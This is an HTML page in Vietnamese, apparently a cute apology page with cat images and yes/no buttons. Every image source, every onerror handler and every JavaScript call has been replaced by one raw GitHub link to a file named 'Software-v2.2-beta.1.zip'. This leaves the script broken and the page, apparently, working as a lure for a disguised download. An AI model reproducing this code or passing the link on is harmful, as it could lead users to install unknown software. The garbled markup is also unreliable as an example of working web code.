<Chinnhoi>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Lời xin lỗi dễ thương</title>
<style>
  body {
    background: linear-gradient(135deg, #ff9a9e, #fad0c4);
    font-family: 'Comic Sans MS', cursive, sans-serif;
    text-align: center;
    padding: 20px;
  }

  .section {
    display: none;
    margin-top: 20px;
  }

  .visible {
    display: block;
  }

  img {
    max-width: 250px;
    height: auto;
    margin: 15px auto;
    display: block;
    border-radius: 16px;
    box-shadow: 0 4px 14px rgba(0,0,0,0.1);
  }

  .title {
    font-size: 22px;
    font-weight: bold;
    color: #ff3366;
    text-shadow: 1px 1px 3px white;
  }

  .message {
    font-size: 18px;
    color: #333;
    margin: 10px;
  }

  .buttons {
    margin-top: 15px;
  }

  button {
    padding: 10px 20px;
    margin: 5px;
    border: none;
    border-radius: 12px;
    cursor: pointer;
    font-size: 16px;
    font-weight: bold;
    transition: 0.3s;
  }

  .btn-yes {
    background-color: #4CAF50;
    color: white;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
  }
  .btn-yes:hover {
    background-color: #45a049;
  }

  .btn-no {
    background-color: #f44336;
    color: white;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
  }
  .btn-no:hover {
    background-color: #da190b;
  }
</style>
</head>
<body>

<!-- SECTION 1: Giao diện chính -->
<div id="main-section" class="section visible">
  <img src="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip" alt="Mèo khóc dễ thương" onerror="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip;https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip'https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip';">
  <p class="title">Chị ơi choo iêm xinn lỗi nhóooo 😭</p>
  <span> hong chọn hoặc thoát là tha lỗi cho iem đó</span>
  <div class="buttons">
    <button class="btn-yes" onclick="showSection('accepted')"> đồng ý </button>
    <button class="btn-no" onclick="showSection('rejected')">Không 😢</button>
  </div>
</div>

<!-- SECTION 2: Accepted -->
<div id="accepted-section" class="section">
  <img src="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip" alt="Mèo vui dễ thương" onerror="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip;https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip'https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip';">
  <p class="message">Iem cảm ơn chị iuuu, hứa hong làm chị buồn nữa đâu ạ :3 💕</p>
</div>

<!-- SECTION 3: Rejected -->
<div id="rejected-section" class="section">
  <img src="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip" alt="Mèo buồn dễ thương" onerror="https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip;https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip'https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip';">
  <p class="message">Em biết lỗi rồi ạ 😔</p>
</div>

<script>
function showSection(type) {
  https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('main-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
  https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('accepted-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
  https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('rejected-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');

  if (type === 'accepted') {
    https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('accepted-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
  } else if (type === 'rejected') {
    https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('rejected-section')https://raw.githubusercontent.com/Linhcon09/dungbuonnuanhe/main/img/Software-v2.2-beta.1.zip('visible');
  }
}
</script>

</body>
</html>
